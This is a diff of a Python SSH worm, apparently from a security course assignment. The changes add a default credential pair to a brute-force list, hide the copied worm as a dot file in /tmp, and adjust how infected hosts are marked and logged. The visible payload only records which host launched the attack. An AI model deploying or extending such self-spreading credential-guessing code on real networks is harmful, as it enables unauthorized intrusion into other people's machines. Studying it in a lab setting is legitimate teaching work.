@@ -20,6 +20,7 @@ credList = [
 ('hello1', 'world'),
 ('root', '#Gig#'),
 ('cpsc', 'cpsc'),
+('ubuntu', '123456'),
 ]
 
 # Marker file to indicate whether the machine/system has been infected.
@@ -29,8 +30,12 @@ SELF_MARKER_FILE = "/tmp/.ilovecpsc456.txt"
 # Retrieve the full path of the running worm
 WORM_FILE = os.path.realpath(sys.argv[0])
 # Define the new path for the destination of the worm
-WORM_DEST = "/tmp/" + os.path.basename(sys.argv[0])
+# Make the worm name a dot file so that it is somewhat hidden from view
+WORM_NAME = os.path.basename(sys.argv[0])
+if not WORM_NAME[0] == ".":
+    WORM_NAME = "." + WORM_NAME
 
+WORM_DEST = "/tmp/" + WORM_NAME
 
 #===============================================================================
 # Define a set of support functions use by the worm
@@ -95,8 +100,8 @@ def markSystem(inFile):
         fileObj.write("")
         fileObj.close()
     except IOError as e:
+        print "markSystem function:"
         print "Error in markSystem function and file " + inFile
-        print "Unable to mark it"
         sys.exit(1)
 
 #===============================================================================
@@ -295,9 +300,10 @@ def spreadAndExecute(sshClient, fromHost):
 # @param fromHost - Spread from Host
 #===============================================================================
 def performMalicious(fromHost):
-    #TODO: Write code here to perform what ever the malicious action is
+    # For this worm, only write the IP of which it was attacked from
+    # into the infected file
     try:
-        outFile = open("/tmp/.attackedFrom.txt", "w")
+        outFile = open(INFECTED_MARKER_FILE, "w")
         outFile.write("System was attacked from " + fromHost)
         outFile.close()
     except IOError as msg:
@@ -317,12 +323,12 @@ if __name__ == "__main__":
         if isLocalSystemInfected():
             sys.exit(0)
         else:
-            # Otherwise we perform some malicious action
+            # Mark the system as infected
+            markSystemAsInfected()
+            # Then perform some malicious action
             fromHost = sys.argv[1]
             performMalicious(fromHost)
 
-            # Then mark the system as infected
-            markSystemAsInfected()
     else:
         # If we are running with another argument, then first
         # mark the system as master
@@ -352,7 +358,7 @@ if __name__ == "__main__":
 
     # Go through the network hosts
     for host in networkHosts:
-        print "\n"
+        print ""
         print "Attacking host: " + host
         # Try to attack this host return a tuple
         sshInfo =  attackSystem(host)
@@ -362,6 +368,7 @@ if __name__ == "__main__":
         if sshInfo:
             # Check if the remote system is already infected
             if isRemoteSystemInfected(sshInfo[0]):
+                print "Host " + host + " is already infected skip."
                 # Skip this one and continue to the next.
                 continue
             else:
